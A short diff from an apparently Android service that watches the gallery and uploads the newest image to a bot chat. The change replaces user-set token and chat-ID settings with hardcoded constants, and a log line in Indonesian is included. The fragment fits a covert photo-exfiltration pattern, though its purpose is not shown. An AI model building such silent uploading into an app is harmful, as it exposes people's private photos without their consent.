@@ -113,9 +113,8 @@ public class GalleryObserverService extends Service {
     private void checkAndUploadLatestImage() {
         if (isUploading) return;
 
-        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
-        String botToken = prefs.getString(KEY_BOT_TOKEN, "");
-        String chatId = prefs.getString(KEY_CHAT_ID, "");
+        String botToken = AppConfig.BOT_TOKEN;
+        String chatId = AppConfig.CHAT_ID;
 
         if (botToken.isEmpty() || chatId.isEmpty()) {
             broadcastLog("[Peringatan] Token atau Chat ID belum disetel!");
